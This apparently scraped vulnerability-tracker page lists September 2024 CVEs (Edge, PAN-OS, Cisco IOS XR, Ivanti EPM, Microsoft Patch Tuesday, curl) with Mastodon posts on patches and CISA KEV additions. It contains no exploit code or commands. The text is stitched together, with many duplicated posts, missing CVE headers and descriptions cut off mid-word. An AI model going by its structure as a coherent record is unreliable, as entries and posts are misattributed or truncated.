CVE-2024-38222
(6.5 MEDIUM)

EPSS: 0.09%

updated 2024-09-12T12:35:54.013000

4 posts

Microsoft Edge (Chromium-based) Information Disclosure Vulnerability

1 repos

#search_error

screaminggoat at 2024-09-12T12:06:52.269Z ##

Microsoft Security Response Center (MSRC): Microsoft Edge (Chromium-based) Information Disclosure Vulnerability
The latest version of Microsoft Edge (Chromium-based) is no longer vulnerable against the CVE IDs initially disclosed by Google on 10 September 2024 (see parent toot above). The new CVE is CVE-2024-38222 (6.5 medium). Read the FAQ to get more information on the info disclosure.

The type of information that could be disclosed if an attacker successfully exploited this vulnerability is Edge WebUI permission. The vulnerability allows an attacker to access a victim's data (for example, microphone and camera) through the victim's Edge WebUI default permission.

#CVE_2024_38222 #microsoft #msrc #edge #chrome #vulnerability #CVE

##
screaminggoat at 2024-09-12T12:02:07.444Z ##

@browserversiontracker @ruario was there no check for Microsoft Edge?
MSRC released a bunch of advisories last night:

  • https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-38222
  • https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-8362
  • https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-7970
  • https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-8194
  • https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-8198
##
screaminggoat@infosec.exchange at 2024-09-12T12:06:52.000Z ##

Microsoft Security Response Center (MSRC): Microsoft Edge (Chromium-based) Information Disclosure Vulnerability
The latest version of Microsoft Edge (Chromium-based) is no longer vulnerable against the CVE IDs initially disclosed by Google on 10 September 2024 (see parent toot above). The new CVE is CVE-2024-38222 (6.5 medium). Read the FAQ to get more information on the info disclosure.

The type of information that could be disclosed if an attacker successfully exploited this vulnerability is Edge WebUI permission. The vulnerability allows an attacker to access a victim's data (for example, microphone and camera) through the victim's Edge WebUI default permission.

CVE-2024-8687
(0 None)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

An information exposure vulnerability exists in Palo Alto Networks PAN-OS software that enables a GlobalProtect end user to learn both the configured GlobalProtect uninstall password and the configured disable or disconnect passcode. After the password or passcode is known, end users can uninstall, disable, or disconnect GlobalProtect even if the GlobalProtect app configuration would not normally

1 repos

#search_error

screaminggoat at 2024-09-11T16:42:03.328Z ##

Happy #PatchTuesday (on a Wednesday) from Palo Alto Networks as they put out 7 security advisories:

  • CVE-2024-8687 (CVSSv4: 6.9 medium) PAN-OS: Cleartext Exposure of GlobalProtect Portal Passcodes
  • CVE-2024-8690 (CVSSv4: 5.6 medium) Cortex XDR Agent: Local Windows Administrator Can Disable the Agent
  • CVE-2024-8689 (CVSSv4: 6.0 medium) ActiveMQ Content Pack: Cleartext Exposure of Credentials
  • CVE-2024-8691 (CVSSv4: 5.3 medium) PAN-OS: User Impersonation in GlobalProtect Portal
  • CVE-2024-8688 (CVSSv4: 6.7 medium) PAN-OS: Arbitrary File Read Vulnerability in the Command Line Interface (CLI)
  • CVE-2024-8686 (CVSSv4: 8.6 high) PAN-OS: Command Injection Vulnerability
  • PAN-SA-2024-0009 Prisma Access Browser: Monthly Vulnerability Updates
    • Note that they backport patches for presumably multiple known exploited Chromium vulnerabilities.

Palo Alto Networks is not aware of any malicious exploitation of this issue.

#pan #paloaltonetworks #vulnerability #cve

(0 None)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

A problem with a detection mechanism in the Palo Alto Networks Cortex XDR agent on Windows devices enables a user with Windows administrator privileges to disable the agent. This issue may be leveraged by malware to disable the Cortex XDR agent and then to perform malicious activity.

(5.5 MEDIUM)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

A vulnerability in the CLI of Cisco IOS XR Software could allow an authenticated, local attacker to read any file in the file system of the underlying Linux operating system. The attacker must have valid credentials on the affected device. This vulnerability is due to incorrect validation of the arguments that are passed to a specific CLI command. An attacker could exploit this vulnerability by

screaminggoat at 2024-09-11T16:15:01.212Z ##

Happy #PatchTuesday (on a Wednesday) from Cisco as they put out 8 security advisories:

  • Cisco IOS XR Software CLI Privilege Escalation Vulnerability CVE-2024-20398 (8.8 high)
  • Cisco Routed Passive Optical Network Controller Vulnerabilities CVE-2024-20483 (7.2 high) and CVE-2024-20489 (8.4 high)
  • Cisco IOS XR Software CLI Arbitrary File Read Vulnerability CVE-2024-20343 (5.5 medium)
  • Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high)
  • Cisco IOS XR Software Segment Routing for Intermediate System-to-Intermediate System Denial of Service Vulnerability CVE-2024-20406 (7.4 high)
  • Cisco IOS XR Software Network Convergence System Denial of Service Vulnerability CVE-2024-20317 (7.4 high)
  • Cisco IOS XR Software Dedicated XML Agent TCP Denial of Service Vulnerability CVE-2024-20390 (5.3 medium)
  • Cisco IOS XR Software UDP Packet Memory Exhaustion Vulnerability CVE-2024-20304 (8.6 high)

The Cisco PSIRT is not aware of any public announcements or malicious use of the vulnerability that is described in this advisory.

#cisco #vulnerability #cve

(7.4 HIGH)

updated 2024-09-12T12:35:54.013000

2 posts

This vulnerability is due to insufficient input validation of ingress IS-IS packets. An attacker could exploit this vulnerability by sendin

  • Cisco IOS XR Software Network Convergence System Denial of Service Vulnerability CVE-2024-20317 (7.4 high)
  • Cisco IOS XR Software Dedicated XML Agent TCP Denial of Service Vulnerability CVE-2024-20390 (5.3 medium)
  • Cisco IOS XR Software UDP Packet Memory Exhaustion Vulnerability CVE-2024-20304 (8.6 high)

The Cisco PSIRT is not aware of any public announcements or malicious use of the vulnerability that is described in this advisory.

#cisco #vulnerability #cve

(7.4 HIGH)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

A vulnerability in the handling of specific Ethernet frames by Cisco IOS XR Software for various Cisco Network Convergence System (NCS) platforms could allow an unauthenticated, adjacent attacker to cause critical priority packets to be dropped, resulting in a denial of service (DoS) condition. This vulnerability is due to incorrect classification of certain types of Ethernet frames that are re

##

CVE-2024-20390
(5.3 MEDIUM)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

A vulnerability in the Dedicated XML Agent feature of Cisco IOS XR Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) on XML TCP listen port 38751. This vulnerability is due to a lack of proper error validation of ingress XML packets. An attacker could exploit this vulnerability by sending a sustained, crafted stream of XML traffic to a targeted device.

screaminggoat at 2024-09-11T16:15:01.212Z ##

CVE-2024-29847
(10.0 CRITICAL)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

5 posts

Deserialization of untrusted data in the agent portal of Ivanti EPM before 2022 SU6, or the 2024 September update allows a remote unauthenticated attacker to achieve remote code execution.

iulianvostrut@mastodon.social at 2024-09-11T06:44:49.000Z ##

URGENT: Ivanti released updates to address 10 critical vulnerabilities, including CVE-2024-29847 with a CVSS score of 10.0. Remote code execution possible. No exploits reported, but immediate updates are crucial. Don't delay! #cybersecurity #vulnerabilities

patchnow24x7 at 2024-09-11T04:34:41.460Z ##

CVE-2024-29847 : CVSS Score 10 : Deserialization of Unstrusted Data vulnerability in Ivanti Endpoint Manager.. #PatchNOW

##
screaminggoat at 2024-09-10T14:57:28.320Z ##

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

#ivanti #vulnerability #cve #epm #iwc #csa

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

screaminggoat at 2024-09-10T15:00:54.167Z ##

Citrix security advisory: Citrix Workspace app for Windows Security Bulletin CVE-2024-7889 and CVE-2024-7890
Happy #PatchTuesday from Citrix.

  • CVE-2024-7889 (CVSSv4: 7.0 high) LPE
  • CVE-2024-7890 (CVSSv4: 5.4 medium) LPE

Fixed in Citrix Workspace app for Windows 2405 and later versions, Citrix Workspace app for Windows 2402 CU1 LTSR and later versions. No mention of exploitation.

CVE-2024-34783
(9.1 CRITICAL)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

An unspecified SQL injection in Ivanti EPM before 2022 SU6, or the 2024 September update allows a remote authenticated attacker with admin privileges to achieve remote code execution.

screaminggoat at 2024-09-10T14:57:28.320Z ##

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

#ivanti #vulnerability #cve #epm #iwc #csa

##
screaminggoat@infosec.exchange at 2024-09-10T14:57:28.000Z ##

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

CVE-2024-32845
(9.1 CRITICAL)

EPSS: 0.04%

updated 2024-09-12T12:35:54.013000

2 posts

An unspecified SQL injection in Ivanti EPM before 2022 SU6, or the 2024 September update allows a remote authenticated attacker with admin privileges to achieve remote code execution.

screaminggoat at 2024-09-10T14:57:28.320Z ##

Ivanti security advisory: September 2024 Security Update
Happy #PatchTuesday from Ivanti. There are some serious vulnerabilities. I want to emphasize that Ivanti stated they "have no evidence of these vulnerabilities being exploited in the wild." See the following advisories:

  • Security Advisory EPM September 2024 for EPM 2024 and EPM 2022
  • Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)
  • Security Advisory Ivanti Workspace Control (IWC)

The big ones:

  • CVE-2024-29847 (perfect 10.0 critical 🥳 cc: @cR0w) deserialization in the agent portal of Ivanti EPM before 2022 SU6/September 2024 update allows unauth RCE
  • CVE-2024-32840, CVE-2024-32842, CVE-2024-32843, CVE-2024-32845, CVE-2024-32846, CVE-2024-32848, CVE-2024-34783, CVE-2024-34785: unspecified SQL injection in Ivanti EPM before 2022 SU6/September 2024 update allow remote authenticated attacker with admin privileges to RCE

#search_error

richi@vmst.io at 2024-09-11T17:36:37.000Z ##

This month Redmond fixes 79 #security flaws in #Windows and other products

As regular as clockwork, it’s #PatchTuesday time again. What exciting treasures did #Microsoft bring us for #September? A good handful of bugs being exploited, including a CVSS  9.8 critical vuln.

The patch haul also includes #CVE202438217: A zero-day that scrotes have known about for SIX YEARS. In #SBBlogwatch, we set the Wayback Machine to Stun. At @TechstrongGroup⁠’s @SecurityBlvd: https://securityboulevard.com/2024/09/patch-tuesday-september-2024-richixbw/?utm_source=richisoc&utm_medium=social&utm_content=richisoc&utm_campaign=richisoc

screaminggoat at 2024-09-10T18:04:38.395Z ##

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
CISA quick on the ball, adds Microsoft zero days to KEV:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability

#Microsoft #cve #zeroday #vulnerability #eitw #cisa #kev #CVE_2024_43491 #CVE_2024_38226 #CVE_2024_38217 #CVE_2024_38014

jackc@kompost.cz at 2024-09-11T07:06:08.000Z ##

#kybez Microsoft Patch Tuesday:
- 79 oprav Windows, z toho 4 aktivně zneužívané, 7 kritických (z toho ale 3 v komponentách Azure a 2 v Sharepointu)
- zajímavá chyba obejití kontrol upravenými LNK soubory (CVE-2024-38217)
- v určitých verzích Windows je zranitelnost, kdy je možné provést downgrade komponent a tím i znovuobjevení starých již opravených zranitelností (CVE-2024-43491)

Celkově klidnější než obvykle.

patchnow24x7 at 2024-09-11T06:52:58.803Z ##

September 2024 : Microsoft Patch Tuesday Summary.

Includes 4 ACTIVELY-EXPLOITED 0-day flaws.

Advisory Links:

CVE-2024-38226 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38226

CVE-2024-43491 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43491

CVE-2024-38014 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38014

CVE-2024-38217 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38217

CVE-2024-38018 : https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-38018

Release Note: https://msrc.microsoft.com/update-guide/releaseNote/2024-Sep

- CVE-2024-38217: Microsoft Windows Mark of the Web (MOTW) Security Feature Bypass Vulnerability https://www.cve.org/CVERecord?id=CVE-2024-38217 @cisacyber #cybersecurity #infosec

Vendor: Microsoft
Product: Windows
Date Added: 2024-09-10

Notes: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38217; https://nvd.nist.gov/vuln/detail/CVE-2024-38217

screaminggoat at 2024-09-10T17:03:51.975Z ##

Happy #PatchTuesday from Microsoft: 79 new CVEs, 4 NEW EXPLOITED ZERO DAYS:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability (EXPLOITED)
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability (EXPLOITED)
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability (EXPLOITED and PUBLICLY DISCLOSED)
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability (EXPLOITED)

EDIT: @BleepingComputer has mentioned that CVE-2024-38217 was marked publicly disclosed. Updated this to reflect it. See related reporting Microsoft September 2024 Patch Tuesday fixes 4 zero-days, 79 flaws

##

CVE-2024-43491
(9.8 CRITICAL)

EPSS: 2.32%

updated 2024-09-12T01:00:01.133000

24 posts

Microsoft is aware of a vulnerability in Servicing Stack that has rolled back the fixes for some vulnerabilities affecting Optional Components on Windows 10, version 1507 (initial version released July 2015). This means that an attacker could exploit these previously mitigated vulnerabilities on Windows 10, version 1507 (Windows 10 Enterprise 2015 LTSB and Windows 10 IoT Enterprise 2015 LTSB) syst

1 repos

#search_error

screaminggoat at 2024-09-10T18:04:38.395Z ##

  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability

##
screaminggoat@infosec.exchange at 2024-09-10T18:04:38.000Z ##

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
CISA quick on the ball, adds Microsoft zero days to KEV:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability

#Microsoft #cve #zeroday #vulnerability #eitw #cisa #kev #CVE_2024_43491 #CVE_2024_38226 #CVE_2024_38217 #CVE_2024_38014

##
screaminggoat at 2024-09-10T18:04:38.395Z ##

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
CISA quick on the ball, adds Microsoft zero days to KEV:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability

##
screaminggoat@infosec.exchange at 2024-09-10T18:04:38.000Z ##

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
CISA quick on the ball, adds Microsoft zero days to KEV:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability

#Microsoft #cve #zeroday #vulnerability #eitw #cisa #kev #CVE_2024_43491 #CVE_2024_38226 #CVE_2024_38217 #CVE_2024_38014

##
screaminggoat at 2024-09-11T20:05:46.486Z ##

@RecklessPush38671 @dangoodin @grey the inconsistency is CISA adding CVE-2024-43491 to the KEV Catalog when Microsoft explicitly states that "no exploitation of CVE-2024-43491 itself has been detected." cc: @todb

##
screaminggoat at 2024-09-11T17:22:36.885Z ##

@grey For reference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43491

My take on the situation is that Microsoft's "Exploitation Detected" means that exploitation happened as a result of the vulnerability which did roll back versions of Windows:

Starting with the Windows security update released March 12, 2024 - KB5035858 (OS Build 10240.20526), the build version numbers crossed into a range that triggered a code defect in the Windows 10 (version 1507) servicing stack that handles the applicability of Optional Components.

I think CISA added CVE-2024-43491 as a knee-jerk reaction on its face value of "exploited"

##
ChrisShort@hachyderm.io at 2024-09-11T10:00:44.000Z ##

CVE-2024-43491 - Security Update Guide - Microsoft - Microsoft Windows Update Remote Code Execution Vulnerability #SuggestedRead #devopsish https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43491

##
jackc@kompost.cz at 2024-09-11T07:06:08.000Z ##

#kybez Microsoft Patch Tuesday:
- 79 oprav Windows, z toho 4 aktivně zneužívané, 7 kritických (z toho ale 3 v komponentách Azure a 2 v Sharepointu)
- zajímavá chyba obejití kontrol upravenými LNK soubory (CVE-2024-38217)
- v určitých verzích Windows je zranitelnost, kdy je možné provést downgrade komponent a tím i znovuobjevení starých již opravených zranitelností (CVE-2024-43491)

Celkově klidnější než obvykle.

##
iulianvostrut@mastodon.social at 2024-09-11T07:05:29.000Z ##

Take immediate action to patch your systems as Microsoft's September Patch Tuesday addresses 79 vulnerabilities, including 7 critical ones with 3 under active attack. CVE-2024-43491 poses a major threat with remote code execution risk. Stay proactive in securing your systems.

patchnow24x7 at 2024-09-11T06:52:58.803Z ##

September 2024 : Microsoft Patch Tuesday Summary.

Includes 4 ACTIVELY-EXPLOITED 0-day flaws.

Advisory Links:

CVE-2024-38226 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38226

CVE-2024-43491 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43491

CVE-2024-38014 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38014

CVE-2024-38217 : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38217

CVE-2024-38018 : https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-38018

##
PC_Fluesterer@social.tchncs.de at 2024-09-11T06:45:25.000Z ##

Microsoft Flickentag 2024-09

Im September 2024 bringt Microsoft (MS) Flicken für stattliche 79 Sicherheitslücken. Darunter sind 7, die MS selbst als kritisch einstuft. Von den Sicherheitslücken wurden und werden 4 bereits für Angriffe genutzt, eine davon schon seit 2018. Besonderes Augenmerk verdient CVE-2024-43491

https://www.pc-fluesterer.info/wordpress/2024/09/11/microsoft-flickentag-2024-09/

#Warnung #cloud #exploits #Microsoft #office #sicherheit #vorbeugen #WX #windows #wissen #zahlen

##
dangoodin at 2024-09-10T21:18:16.136Z ##

I'm having trouble parsing Microsoft's bulletin for CVE-2024-43491 (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43491). The bulletin has a "yes" under exploited. It also says: "Microsoft is aware of a vulnerability in Servicing Stack that has rolled back the fixes for some vulnerabilities." (Emphasis mine.) I interpret this as saying that yes, 43491 is under active exploit.

But later, the bulletin says: "This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected."

So, is this an 0day or not?

##
AAKL at 2024-09-10T18:11:36.210Z ##

#CISA has added several #Microsoft vulnerabilities to the KEV lcatalogue.

- CVE-2024-38226: Microsoft Publisher Security Feature Bypass Vulnerability https://www.cve.org/CVERecord?id=CVE-2024-38226

- CVE-2024-43491: Microsoft Windows Update Remote Code Execution Vulnerability https://www.cve.org/CVERecord?id=CVE-2024-43491

- CVE-2024-38014: Microsoft Windows Installer Privilege Escalation Vulnerability https://www.cve.org/CVERecord?id=CVE-2024-38014

- CVE-2024-38217: Microsoft Windows Mark of the Web (MOTW) Security Feature Bypass Vulnerability https://www.cve.org/CVERecord?id=CVE-2024-38217 @cisacyber #cybersecurity #infosec

cisakevtracker@mastodon.social at 2024-09-10T18:01:22.000Z ##

CVE ID: CVE-2024-43491
Vendor: Microsoft
Product: Windows
Date Added: 2024-09-10
Vulnerability: Microsoft Windows Update Remote Code Execution Vulnerability
Notes: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43491; https://nvd.nist.gov/vuln/detail/CVE-2024-43491
CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2024-43491

##
screaminggoat at 2024-09-10T17:20:23.618Z ##

@mttaggart Yeah I'm reading it the same way. Also concerning: This CVE itself wasn't exploited but it is marked as such. Microsoft doesn't elaborate on which CVEs were exploited as a result of this:

This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected.

sorry @cR0w. I was responding at the time and didn't include you.

##
screaminggoat at 2024-09-10T17:03:51.975Z ##

Happy #PatchTuesday from Microsoft: 79 new CVEs, 4 NEW EXPLOITED ZERO DAYS:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability (EXPLOITED)
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability (EXPLOITED)
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability (EXPLOITED and PUBLICLY DISCLOSED)
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability (EXPLOITED)

EDIT: @BleepingComputer has mentioned that CVE-2024-38217 was marked publicly disclosed. Updated this to reflect it. See related reporting Microsoft September 2024 Patch Tuesday fixes 4 zero-days, 79 flaws

My take on the situation is that Microsoft's "Exploitation Detected" means that exploitation happened as a result of the vulnerability which did roll back versions of Windows:

Starting with the Windows security update released March 12, 2024 - KB5035858 (OS Build 10240.20526), the build version numbers crossed into a range that triggered a code defect in the Windows 10 (version 1507) servicing stack that handles the applicability of Optional Components.

I think CISA added CVE-2024-43491 as a knee-jerk reaction on its face value of "exploited"

cisakevtracker@mastodon.social at 2024-09-10T18:01:06.000Z ##

CVE ID: CVE-2024-38014
Vendor: Microsoft
Product: Windows
Date Added: 2024-09-10
Vulnerability: Microsoft Windows Installer Privilege Escalation Vulnerability
Notes: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38014; https://nvd.nist.gov/vuln/detail/CVE-2024-38014
CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2024-38014

##
screaminggoat at 2024-09-10T17:03:51.975Z ##

Happy #PatchTuesday from Microsoft: 79 new CVEs, 4 NEW EXPLOITED ZERO DAYS:

  • CVE-2024-43491 (9.8 critical) Microsoft Windows Update Remote Code Execution Vulnerability (EXPLOITED)
  • CVE-2024-38226 (7.3 high) Microsoft Publisher Security Feature Bypass Vulnerability (EXPLOITED)
  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability (EXPLOITED and PUBLICLY DISCLOSED)
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability (EXPLOITED)

EDIT: @BleepingComputer has mentioned that CVE-2024-38217 was marked publicly disclosed. Updated this to reflect it. See related reporting Microsoft September 2024 Patch Tuesday fixes 4 zero-days, 79 flaws

  • CVE-2024-38217 (5.4 medium) Windows Mark of the Web Security Feature Bypass Vulnerability
  • CVE-2024-38014 (7.8 high) Windows Installer Elevation of Privilege Vulnerability

  • CVE-2024-7890 (CVSSv4: 5.4 medium) LPE

(7.2 HIGH)

updated 2024-09-11T18:31:14

Multiple vulnerabilities in Cisco Routed PON Controller Software, which runs as a docker container on hardware that is supported by Cisco IOS XR Software, could allow an authenticated, remote attacker with Administrator-level privileges on the PON Manager or direct access to the PON Manager MongoDB instance to perform command injection attacks on the PON Controller container and execute arbitrary

screaminggoat at 2024-09-11T16:15:01.212Z ##

Happy #PatchTuesday (on a Wednesday) from Cisco as they put out 8 security advisories:

  • Cisco IOS XR Software CLI Privilege Escalation Vulnerability CVE-2024-20398 (8.8 high)
  • Cisco Routed Passive Optical Network Controller Vulnerabilities CVE-2024-20483 (7.2 high) and CVE-2024-20489 (8.4 high)
  • Cisco IOS XR Software CLI Arbitrary File Read Vulnerability CVE-2024-20343 (5.5 medium)
  • Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high)
  • Cisco IOS XR Software Segment Routing for Intermediate System-to-Intermediate System Denial of Service Vulnerability CVE-2024-20406 (7.4 high)
  • Cisco IOS XR Software Network Convergence System Denial of Service Vulnerability CVE-2024-20317 (7.4 high)
  • Cisco IOS XR Software Dedicated XML Agent TCP Denial of Service Vulnerability CVE-2024-20390 (5.3 medium)
  • Cisco IOS XR Software UDP Packet Memory Exhaustion Vulnerability CVE-2024-20304 (8.6 high)

The Cisco PSIRT is not aware of any public announcements or malicious use of the vulnerability that is described in this advisory.

#cisco #vulnerability #cve

CVE-2024-20304
(8.6 HIGH)

EPSS: 0.04%

updated 2024-09-11T18:31:08

2 posts

A vulnerability in the multicast traceroute version 2 (Mtrace2) feature of Cisco IOS XR Software could allow an unauthenticated, remote attacker to exhaust the UDP packet memory of an affected device. This vulnerability exists because the Mtrace2 code does not properly handle packet memory. An attacker could exploit this vulnerability by sending crafted packets to an affected device. A successful

A vulnerability in the CLI of Cisco IOS XR Software could allow an authenticated, local attacker to obtain read/write file system access on the underlying operating system of an affected device. This vulnerability is due to insufficient validation of user arguments that are passed to specific CLI commands. An attacker with a low-privileged account could exploit this vulnerability by using crafted

##

CVE-2024-8096
(6.5 MEDIUM)

EPSS: 0.04%

updated 2024-09-11T16:26:11.920000

2 posts

When curl is told to use the Certificate Status Request TLS extension, often referred to as OCSP stapling, to verify that the server certificate is valid, it might fail to detect some OCSP problems and instead wrongly consider the response as fine. If the returned status reports another error than 'revoked' (like for example 'unauthorized') it is not treated as a bad certficate.

bagder@mastodon.social at 2024-09-11T05:49:13.000Z ##

